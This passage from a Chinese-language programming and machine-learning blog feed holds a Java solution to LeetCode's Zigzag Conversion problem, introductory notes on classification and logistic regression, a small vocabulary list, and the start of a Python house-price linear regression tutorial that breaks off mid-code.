class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 18:54 2022/11/12</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> * Z 字形变换</span></span><br><span class="line"><span class="comment"> * 将一个给定字符串 s 根据给定的行数 numRows ，以从上往下、从左到右进行 Z 字形排列。</span></span><br><span class="line"><span class="comment"> * 之后，你的输出需要从左往右逐行读取，产生出一个新的字符串</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 比如输入字符串为 &quot;PAYPALISHIRING&quot; 行数为 3 时;</span></span><br><span class="line"><span class="comment"> * 输出需要从左往右逐行读取，产生出一个新的字符串为：&quot;PAHNAPLSIIGYIR&quot;。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Aigo_006</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;PAYPALISHIRING&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> convert(str, <span class="number">3</span>);</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">convert</span><span class="params">(String str, <span class="type">int</span> numRows)</span> &#123;</span><br><span class="line">        <span class="comment">// 单个字符情况</span></span><br><span class="line">        <span class="keyword">if</span> (numRows &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> str;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 存放行结果</span></span><br><span class="line">        List&lt;StringBuilder&gt; rows = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成指定行数 stringbuilder</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; numRows; i++) &#123;</span><br><span class="line">            rows.add(<span class="keyword">new</span> <span class="title class_">StringBuilder</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 行数</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 首位变换标识</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">flag</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历字符串</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c : str.toCharArray()) &#123;</span><br><span class="line">            <span class="comment">// 向目标行添加字符</span></span><br><span class="line">            rows.get(i).append(c);</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span> || i == numRows - <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="comment">// 首尾标志变换</span></span><br><span class="line">                flag = -flag;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 行数变换</span></span><br><span class="line">            i += flag;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 存储结果</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="comment">// 遍历添加结果</span></span><br><span class="line">        <span class="keyword">for</span> (StringBuilder row : rows) &#123;</span><br><span class="line">            result.append(row);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="五：思路总结"><a href="#五：思路总结" class="headerlink" title="五：思路总结"></a>五：思路总结</h2><ul><li>将 Z 形变换的结果，存储到一个父 StringBuilder 中。通过下标，控制向子 StringBuilder 中添加字符，即添加到对应的行中。</li><li>通过 flag 变量，来控制遍历字符串时，对子 StringBuilder 的选择。</li><li>遍历父 StringBuilder ，获取最终的输出结果。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 算法练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AI_逻辑回归（2）</title>
      <link href="/blog/3975e23f.html/"/>
      <url>/blog/3975e23f.html/</url>
      
        <content type="html"><![CDATA[<h1 id="逻辑回归"><a href="#逻辑回归" class="headerlink" title="逻辑回归"></a>逻辑回归</h1><h2 id="一：复杂的分类问题"><a href="#一：复杂的分类问题" class="headerlink" title="一：复杂的分类问题"></a>一：复杂的分类问题</h2><h3 id="1-直线决策边界"><a href="#1-直线决策边界" class="headerlink" title="1. 直线决策边界"></a>1. 直线决策边界</h3><p>通过 x<sub>1</sub> 和 x<sub>2</sub> 去判断 y的值</p><img src="/blog/3975e23f.html/image-20221112141044914.png" style="zoom: 33%;"><p>概念分布函数</p><img src="/blog/3975e23f.html/image-20221112141306835.png" style="zoom: 50%;"><p>核心问题：找到 g(x)，即蓝色的直线；</p><img src="/blog/3975e23f.html/image-20221112141349124.png" style="zoom:50%;"><p>决策边界：</p><img src="/blog/3975e23f.html/image-20221112141504765.png" style="zoom:50%;"><h3 id="2-圆形决策边界"><a href="#2-圆形决策边界" class="headerlink" title="2. 圆形决策边界"></a>2. 圆形决策边界</h3><img src="/blog/3975e23f.html/image-20221112141701950.png" style="zoom: 33%;"><p>获取概念分布，逻辑回归方程：</p><img src="/blog/3975e23f.html/image-20221112141808332.png" style="zoom: 50%;"><p>圆形的 g(x) 与直线的 g(x) 不同，新增了2此项。由此获取一个曲线或者圆形。</p><img src="/blog/3975e23f.html/image-20221112142014947.png" style="zoom: 50%;"><p>决策边界：</p><p><img src="/blog/3975e23f.html/image-20221112142059035.png"></p><h3 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h3><ul><li>当使用逻辑回归去求解问题时，核心即找到决策边界。</li><li>逻辑回归结合多项式的边界函数，可以解决复杂的分类问题。<ul><li>线性边界，即多项式为1次；</li><li>圆形边界，即多项式为2次；</li></ul></li></ul><h2 id="二：逻辑回归问题求解"><a href="#二：逻辑回归问题求解" class="headerlink" title="二：逻辑回归问题求解"></a>二：逻辑回归问题求解</h2><ul><li>概念分布函数</li><li>对应的边界函数关系</li></ul><h3 id="1-寻找类别边界"><a href="#1-寻找类别边界" class="headerlink" title="1. 寻找类别边界"></a>1. 寻找类别边界</h3><p>根据训练样本，寻找类别边界；</p><p>即：根据训练样本，寻找找 θ<sub>0</sub>、θ<sub>1</sub>、θ<sub>2</sub></p><img src="/blog/3975e23f.html/image-20221112142629280.png" style="zoom:50%;"><h3 id="2-如何求解系数"><a href="#2-如何求解系数" class="headerlink" title="2.  如何求解系数"></a>2.  如何求解系数</h3><img src="/blog/3975e23f.html/image-20221112142953201.png" style="zoom:50%;"><p>分类问题，标签与预测结果都是离散的点，使用该损失函数无法寻找到极小值点。</p><img src="/blog/3975e23f.html/image-20221112143359941.png" style="zoom: 50%;"><p>图像：</p><p><img src="/blog/3975e23f.html/20200407084418389.png"></p><p>等效转换关系式：</p><img src="/blog/3975e23f.html/image-20221112144946188.png" style="zoom: 50%;"><p>带入P(x)，求解</p><img src="/blog/3975e23f.html/image-20221112145047414.png" style="zoom:50%;"><p>采用梯度下降法，获取最小化的损失函数 J</p><img src="/blog/3975e23f.html/image-20221112145205900.png" style="zoom:50%;"><h2 id="三：命名问题"><a href="#三：命名问题" class="headerlink" title="三：命名问题"></a>三：命名问题</h2><p>逻辑回归的主要场景是分类问题，称其为逻辑回归是否合适，为什么？</p><p>逻辑回归虽然名字中有回归，但实际上它是一个<code>二分类算法</code>。</p><p>逻辑回归实际上就是在多元线性回归（θᵀx）的基础上，多嵌套了一个函数，这个函数就是 sigmoid 函数，也被称为 S 型曲线。 </p><img src="/blog/3975e23f.html/image-20221112153624030.png" style="zoom: 67%;"><p>简化表达：</p><img src="/blog/3975e23f.html/image-20221112153714798.png" style="zoom:67%;"><p>函数图像：</p><img src="/blog/3975e23f.html/image-20221112162347188.png" style="zoom:50%;"><p style="text-indent:2em">由 sigmoid 函数图像看知，其值域为(0,1)。因此逻辑回归就是在多元线性回归的基础上，讲结果缩放到了0 和 1 之间。</p><p style="text-indent:2em">当我们通过线性函数得到一个结果，这个结果越小于0，函数输出就越接近0；结果越大于0，函数输出就越接近1，而分类算法的输出一般情况下都会是 input 属于某个类别的概念大小，因此用0到1之间的范围刚好可以表示概念。中间的0.5则将结果划分为两个类别。所以，我们可以简单的将 sigmoid 函数理解成一个将输出转化为属于某个类别的概念的函数。</p><p style="text-indent:2em">综上所述，逻辑回归的大体思想就是，多元线性回归算法回归出一个分类超平面，预测样本通过代入这个超平面，如果是负就说明在这个超平面的下方，如果是正就说明是在这个超平面的上方。再通过 sigmoid 转换为概率，最好通过概率输出类别。</p><h2 id="四：逻辑回归统计学模型：伯努利分布"><a href="#四：逻辑回归统计学模型：伯努利分布" class="headerlink" title="四：逻辑回归统计学模型：伯努利分布"></a>四：逻辑回归统计学模型：伯努利分布</h2><p style="text-indent:2em">我们知道，对于二分类算法，样本只有两个标签，要么是0要么是1，并且二分类有一个特点，那就是我们最终预测样本的概念，正例加上负例的概念总和是1。即每一次预测我们都可以这样表示：</p><img src="/blog/3975e23f.html/image-20221112164826386.png" style="zoom:50%;"><p>这个公式不就是伯努利分布（0-1分布）嘛！</p><p>因此，对于模型每一次预测的输出，我们都可以写成伯努利分布的形式：</p><img src="/blog/3975e23f.html/image-20221112164938371.png" style="zoom:50%;"><p>细微差异：</p><p>伯努利分布中，最经典的案例就是抛硬币。只不过在抛硬币前我们已经假设概率是对半分的。</p><p>但是在逻辑回归中，概念是需要通过每一次模型预测给出的。</p>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人工智能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AI_逻辑回归（1）</title>
      <link href="/blog/2bc04dd1.html/"/>
      <url>/blog/2bc04dd1.html/</url>
      
        <content type="html"><![CDATA[<h1 id="逻辑回归"><a href="#逻辑回归" class="headerlink" title="逻辑回归"></a>逻辑回归</h1><h2 id="一：分类任务"><a href="#一：分类任务" class="headerlink" title="一：分类任务"></a>一：分类任务</h2><p>任务：根据余额判断小明是否会去看电影；</p><p>训练数据：</p><p>余额为1、2、3、4、5，看电影（正样本）</p><p>余额为-1、-2、-3、-4、-5，不看电源（负样本）</p><p>作图：</p><img src="/blog/2bc04dd1.html/image-20221112132044937.png" style="zoom: 50%;"><h2 id="二：线性回归预测"><a href="#二：线性回归预测" class="headerlink" title="二：线性回归预测"></a>二：线性回归预测</h2><h3 id="1-预测结果"><a href="#1-预测结果" class="headerlink" title="1. 预测结果"></a>1. 预测结果</h3><p><img src="/blog/2bc04dd1.html/image-20221112132324518.png"></p><h3 id="2-存在问题"><a href="#2-存在问题" class="headerlink" title="2. 存在问题"></a>2. 存在问题</h3><p>当样本量变大以后，准确率会下降；</p><img src="/blog/2bc04dd1.html/image-20221112132447332.png" style="zoom:50%;"><p>当 x&#x3D;1 时，受到很远处离散点的影响，预测结果开始出现偏差。</p><img src="/blog/2bc04dd1.html/image-20221112132511717.png" style="zoom:50%;"><h2 id="三：逻辑回归预测"><a href="#三：逻辑回归预测" class="headerlink" title="三：逻辑回归预测"></a>三：逻辑回归预测</h2><h3 id="1-逻辑回归方程"><a href="#1-逻辑回归方程" class="headerlink" title="1.  逻辑回归方程"></a>1.  逻辑回归方程</h3><p><img src="/blog/2bc04dd1.html/image-20221112132723062.png"></p><h3 id="2-函数图像"><a href="#2-函数图像" class="headerlink" title="2. 函数图像"></a>2. 函数图像</h3><img src="/blog/2bc04dd1.html/image-20221112132801192.png" style="zoom:50%;"><h3 id="3-预测结果"><a href="#3-预测结果" class="headerlink" title="3. 预测结果"></a>3. 预测结果</h3><img src="/blog/2bc04dd1.html/image-20221112132833753.png" style="zoom:67%;"><p>由上可知，相比线性回归而言，采用逻辑回归拟合数据，可以更好的完成分类任务！</p><h2 id="四：逻辑回归"><a href="#四：逻辑回归" class="headerlink" title="四：逻辑回归"></a>四：逻辑回归</h2><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1. 概念"></a>1. 概念</h3><p>用于解决<code>分类问题</code>的一种模型。</p><p>根据数据特征或者属性，计算其归属于某一类别的概念P(x)，根据概念数值判断其所属类别。</p><h3 id="2-应用场景"><a href="#2-应用场景" class="headerlink" title="2. 应用场景"></a>2. 应用场景</h3><p>二分类问题</p><h3 id="3-数学表达式"><a href="#3-数学表达式" class="headerlink" title="3. 数学表达式"></a>3. 数学表达式</h3><p>逻辑回归方程，也称作 sigmoid 方程。</p><img src="/blog/2bc04dd1.html/image-20221112133325084.png" style="zoom:50%;"><h3 id="4-典型逻辑回归概念分布曲线"><a href="#4-典型逻辑回归概念分布曲线" class="headerlink" title="4. 典型逻辑回归概念分布曲线"></a>4. 典型逻辑回归概念分布曲线</h3><img src="/blog/2bc04dd1.html/image-20221112133548301.png" style="zoom:50%;"><h3 id="5-任务预测"><a href="#5-任务预测" class="headerlink" title="5. 任务预测"></a>5. 任务预测</h3><p>根据余额判断小明是否会去看电影（余额-10，100）</p><p>逻辑回归方程：</p><img src="/blog/2bc04dd1.html/image-20221112133800325.png" style="zoom:50%;"><p>带入参数值，获得结果：</p><img src="/blog/2bc04dd1.html/image-20221112133827988.png" style="zoom:50%;"><p>结论：</p><p>余额 -10，即 y &#x3D; 0，不去看电影；</p><p>余额 100，即 y &#x3D; 1，去看电影；</p>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人工智能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AI_分类问题</title>
      <link href="/blog/cebf40ec.html/"/>
      <url>/blog/cebf40ec.html/</url>
      
        <content type="html"><![CDATA[<h1 id="分类问题"><a href="#分类问题" class="headerlink" title="分类问题"></a>分类问题</h1><h2 id="一：什么是分类问题？"><a href="#一：什么是分类问题？" class="headerlink" title="一：什么是分类问题？"></a>一：什么是分类问题？</h2><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1. 概念"></a>1. 概念</h3><p>根据已知样本的某些特征，判断一个新样本属于哪一个已知样本类。</p><h3 id="2-基本框架"><a href="#2-基本框架" class="headerlink" title="2. 基本框架"></a>2. 基本框架</h3><img src="/blog/cebf40ec.html/image-20221112112849719.png" style="zoom:50%;"><p>其中 x 为样本的特征，即属性。</p><h3 id="3-案例"><a href="#3-案例" class="headerlink" title="3. 案例"></a>3. 案例</h3><h3 id="（1）邮件分类"><a href="#（1）邮件分类" class="headerlink" title="（1）邮件分类"></a>（1）邮件分类</h3><img src="/blog/cebf40ec.html/image-20221112121652551.png" style="zoom: 50%;"><h3 id="（2）任务"><a href="#（2）任务" class="headerlink" title="（2）任务"></a>（2）任务</h3><ul><li>输入：电子邮件</li><li>输出：此邮件为垃圾邮件 &#x2F; 普通邮件</li></ul><h3 id="（3）流程"><a href="#（3）流程" class="headerlink" title="（3）流程"></a>（3）流程</h3><ol><li>标注样本邮件为垃圾&#x2F;普通邮件（人）</li><li>获取批量的样本邮件及其标签，学习其特征（计算机）</li><li>针对新的邮件，自动判断其类别（计算机）</li></ol><h3 id="（4）样本特征"><a href="#（4）样本特征" class="headerlink" title="（4）样本特征"></a>（4）样本特征</h3><ul><li>发件人包含字符：% &amp; * …</li><li>正文包含：现金、领取等</li><li>其他特征</li></ul><h3 id="（5）处理流程"><a href="#（5）处理流程" class="headerlink" title="（5）处理流程"></a>（5）处理流程</h3><p>使得每一个特征例如：包含字符 %： x<sub>1</sub>&#x3D;0 或者 x<sub>1</sub>&#x3D;1 ；</p><p>其次根据样本的特征值，获得 y &#x3D; 0；</p><p>由此判断出是否为垃圾邮件。</p><h2 id="二：解决分类问题的常用算法"><a href="#二：解决分类问题的常用算法" class="headerlink" title="二：解决分类问题的常用算法"></a>二：解决分类问题的常用算法</h2><h3 id="1-逻辑回归"><a href="#1-逻辑回归" class="headerlink" title="1. 逻辑回归"></a>1. 逻辑回归</h3><ul><li><p>建立逻辑回归方程，判断样本属于哪一个样本类。</p></li><li><img src="/blog/cebf40ec.html/image-20221112114123140.png" style="zoom:67%;"></li></ul><h3 id="2-KNN邻近模型"><a href="#2-KNN邻近模型" class="headerlink" title="2. KNN邻近模型"></a>2. KNN邻近模型</h3><ul><li>判断样本与周边样本点之间的距离，来决定样本属于哪个样本类。</li><li><img src="/blog/cebf40ec.html/image-20221112114257127.png" style="zoom:67%;"></li></ul><h3 id="3-决策树"><a href="#3-决策树" class="headerlink" title="3. 决策树"></a>3. 决策树</h3><ul><li>通过大量的问题，来建立许多的分支，来逐步判断样本属于哪个样本类。</li><li><img src="/blog/cebf40ec.html/image-20221112114503362.png" style="zoom:67%;"></li></ul><h3 id="4-神经网络"><a href="#4-神经网络" class="headerlink" title="4. 神经网络"></a>4. 神经网络</h3><ul><li>基于一些输入，自动会输出一些信号，用来判断样本属于哪个样本类。</li><li><img src="/blog/cebf40ec.html/image-20221112114543346.png" style="zoom:67%;"></li></ul><h2 id="三：常见的分类问题"><a href="#三：常见的分类问题" class="headerlink" title="三：常见的分类问题"></a>三：常见的分类问题</h2><ul><li><p>垃圾邮件检测</p><ul><li><img src="/blog/cebf40ec.html/image-20221112121652551.png" style="zoom: 50%;"></li></ul></li><li><p>图像分类</p><ul><li><img src="/blog/cebf40ec.html/image-20221112122221334.png" style="zoom: 67%;"></li></ul></li><li><p>数字识别</p><ul><li><img src="/blog/cebf40ec.html/image-20221112122314909.png" style="zoom:80%;"></li></ul></li><li><p>考试通过测试</p><ul><li><img src="/blog/cebf40ec.html/image-20221112122415827.png"></li></ul></li></ul><h2 id="四：分类任务与回归任务的区别"><a href="#四：分类任务与回归任务的区别" class="headerlink" title="四：分类任务与回归任务的区别"></a>四：分类任务与回归任务的区别</h2><h3 id="1-差异"><a href="#1-差异" class="headerlink" title="1. 差异"></a>1. 差异</h3><ul><li>分类任务<ul><li>分类目标：判断类别</li><li>模型输出：非连续型标签</li></ul></li><li>回归任务<ul><li>回归目标：建立函数关系</li><li>模型输出：连续型数值</li></ul></li></ul><p><img src="/blog/cebf40ec.html/image-20221112122601219.png"></p><h3 id="2-判断"><a href="#2-判断" class="headerlink" title="2. 判断"></a>2. 判断</h3><ul><li><p>分类问题</p><ul><li>根据房屋信息预测其是否受欢迎</li><li>猫狗图像识别</li><li>股价涨跌预测</li></ul></li><li><p>回归问题</p><ul><li>根据房屋信息预测房屋价格</li><li>股价预测</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人工智能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>专业词汇积累008</title>
      <link href="/blog/2be1cfa0.html/"/>
      <url>/blog/2be1cfa0.html/</url>
      
        <content type="html"><![CDATA[<h1 id="Professional-Vocabulary-Accumulation-008"><a href="#Professional-Vocabulary-Accumulation-008" class="headerlink" title="Professional Vocabulary Accumulation_008"></a>Professional Vocabulary Accumulation_008</h1><ul><li>Classification</li><li>分类</li><li>Decision Boundary</li><li>决策边界</li><li>Logistic Regression</li><li>逻辑回归</li><li>convert</li><li>转换</li><li>flag</li><li>旗</li></ul>]]></content>
      
      
      <categories>
          
          <category> 专业词汇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 专业词汇 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AI_多因子线性回归</title>
      <link href="/blog/2539a3f8.html/"/>
      <url>/blog/2539a3f8.html/</url>
      
        <content type="html"><![CDATA[<h1 id="多因子房价预测"><a href="#多因子房价预测" class="headerlink" title="多因子房价预测"></a>多因子房价预测</h1><h2 id="一：影响房屋价格因素"><a href="#一：影响房屋价格因素" class="headerlink" title="一：影响房屋价格因素"></a>一：影响房屋价格因素</h2><ul><li>地区平均收入</li><li>房屋平均年龄</li><li>房屋房间数量</li><li>地区人口数量</li><li>房屋尺寸大小</li></ul><h2 id="二：实现目标"><a href="#二：实现目标" class="headerlink" title="二：实现目标"></a>二：实现目标</h2><p>基于 housing_price.csv 数据，建立线性回归模型，预测合理房价：</p><ol><li>以面积为输入变量，建立单因子模型，评估模型表现，可视化线性回归预测结果</li><li>以收入、房屋年龄、房间数量、人口数量、房屋尺寸为输入变量，建立多因子模型，评估表现</li><li>预测 收入&#x3D;65000，房屋年龄&#x3D;5，房间数量&#x3D;5，人口数量&#x3D;30000，房间尺寸&#x3D;200的合理房价</li></ol><h2 id="三：代码实现"><a href="#三：代码实现" class="headerlink" title="三：代码实现"></a>三：代码实现</h2><h3 id="1-加载数据"><a href="#1-加载数据" class="headerlink" title="1. 加载数据"></a>1. 加载数据</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># load the data</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">data = pd.read_csv(<span class="string">&#x27;housing_price.csv&#x27;</span>)</span><br><span class="line">data.head()</span><br></pre></td></tr></table></figure><p><img src="/blog/2539a3f8.html/image-20221111230129984.png"></p><h3 id="2-可视化数据"><a href="#2-可视化数据" class="headerlink" title="2. 可视化数据"></a>2. 可视化数据</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># visualizing data</span></span><br><span class="line"><span class="comment"># 内嵌绘图，可省略 plt.show() 这一步</span></span><br><span class="line">%matplotlib inline</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line">fig = plt.figure(figsize=(<span class="number">10</span>,<span class="number">10</span>))</span><br><span class="line">fig1 = plt.subplot(<span class="number">231</span>)  <span class="comment"># 两行三列第一个图</span></span><br><span class="line">plt.scatter(data.loc[:,<span class="string">&#x27;Avg. Area Income&#x27;</span>],data.loc[:,<span class="string">&#x27;Price&#x27;</span>])</span><br><span class="line">plt.title(<span class="string">&#x27;Price VS Income&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fig2 = plt.subplot(<span class="number">232</span>)  <span class="comment"># 两行三列第二个图</span></span><br><span class="line">plt.scatter(data.loc[:,<span class="string">&#x27;Avg. Area House Age&#x27;</span>],data.loc[:,<span class="string">&#x27;Price&#x27;</span>])</span><br><span class="line">plt.title(<span class="string">&#x27;Price VS House Age&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fig3 = plt.subplot(<span class="number">233</span>)  <span class="comment"># 两行三列第三个图</span></span><br><span class="line">plt.scatter(data.loc[:,<span class="string">&#x27;Avg. Area Number of Rooms&#x27;</span>],data.loc[:,<span class="string">&#x27;Price&#x27;</span>])</span><br><span class="line">plt.title(<span class="string">&#x27;Price VS Number of Rooms&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fig4 = plt.subplot(<span class="number">234</span>)  <span class="comment"># 两行三列第四个图</span></span><br><span class="line">plt.scatter(data.loc[:,<span class="string">&#x27;Area Population&#x27;</span>],data.loc[:,<span class="string">&#x27;Price&#x27;</span>])</span><br><span class="line">plt.title(<span class="string">&#x27;Price VS Area Population&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fig5 = plt.subplot(<span class="number">235</span>)  <span class="comment"># 两行三列第五个图</span></span><br><span class="line">plt.scatter(data.loc[:,<span class="string">&#x27;size&#x27;</span>],data.loc[:,<span class="string">&#x27;Price&#x27;</span>])</span><br><span class="line">plt.title(<span class="string">&#x27;Price VS size&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt.show() <span class="comment"># 可以省略</span></span><br></pre></td></tr></table></figure><p><img src="/blog/2539a3f8.html/image-20221111233254168.png"></p><h3 id="3-建立单因子模型（面积）"><a href="#3-建立单因子模型（面积）" class="headerlink" title="3. 建立单因子模型（面积）"></a>3. 建立单因子模型（面积）</h3><h4 id="（1）定义-X、Y"><a href="#（1）定义-X、Y" class="headerlink" title="（1）定义 X、Y"></a>（1）定义 X、Y</h4><p>X：影响因素；Y：结果值</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># define x and y</span></span><br><span class="line">X = data.loc[:,<span class="string">&#x27;size&#x27;</span>]</span><br><span class="line">y = data.loc[:,<span class="string">&#x27;Price&#x27;</span>]</span><br><span class="line">y.head()</span><br></pre></td></tr></table></figure><h4 id="（2）建立回归模型"><a href="#（2）建立回归模型" class="headerlink" title="（2）建立回归模型"></a>（2）建立回归模型</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># set up the linear regression model</span></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression</span><br><span class="line">LR1 = LinearRegression()</span><br><span class="line"><span class="comment"># reshape data</span></span><br><span class="line">X = np.array(X).reshape(-<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(X.shape)</span><br><span class="line"><span class="comment"># train the model</span></span><br><span class="line">LR1.fit(X,y)</span><br></pre></td></tr></table></figure><h4 id="（3）模型预测"><a href="#（3）模型预测" class="headerlink" title="（3）模型预测"></a>（3）模型预测</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># calulate the price vs size </span></span><br><span class="line">y_predict_1 = LR1.predict(X)</span><br><span class="line"><span class="built_in">print</span>(y_predict_1)</span><br></pre></td></tr></table></figure><h4 id="（4）模型评估"><a href="#（4）模型评估" class="headerlink" title="（4）模型评估"></a>（4）模型评估</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># evaluate the model</span></span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> mean_squared_error,r2_score</span><br><span class="line">mean_squared_error_1 = mean_squared_error(y,y_predict_1)</span><br><span class="line">r2_score_1 = r2_score(y,y_predict_1)</span><br><span class="line"><span class="built_in">print</span>(mean_squared_error_1,r2_score_1)</span><br></pre></td></tr></table></figure><h4 id="（5）可视化预测结果"><a href="#（5）可视化预测结果" class="headerlink" title="（5）可视化预测结果"></a>（5）可视化预测结果</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># visualizing predict result</span></span><br><span class="line">fig_res = plt.figure(figsize=(<span class="number">8</span>,<span class="number">5</span>))</span><br><span class="line">plt.scatter(X,y)</span><br><span class="line">plt.plot(X,y_predict_1,<span class="string">&#x27;r&#x27;</span>) <span class="comment"># 红线表示</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><img src="/blog/2539a3f8.html/image-20221112000554219.png" style="zoom:67%;"><h3 id="4-建立多因子模型"><a href="#4-建立多因子模型" class="headerlink" title="4. 建立多因子模型"></a>4. 建立多因子模型</h3><h4 id="（1）定义多因子-X"><a href="#（1）定义多因子-X" class="headerlink" title="（1）定义多因子 X"></a>（1）定义多因子 X</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># define X_multi</span></span><br><span class="line">X_multi = data.drop([<span class="string">&#x27;Price&#x27;</span>],axis=<span class="number">1</span>) <span class="comment"># 排除Price列，axis=1 表示横轴从左往右</span></span><br><span class="line">X_multi</span><br></pre></td></tr></table></figure><h4 id="（2）建立多因子回归模型"><a href="#（2）建立多因子回归模型" class="headerlink" title="（2）建立多因子回归模型"></a>（2）建立多因子回归模型</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># set up 2nd linear regression model</span></span><br><span class="line">LR_multi = LinearRegression()</span><br><span 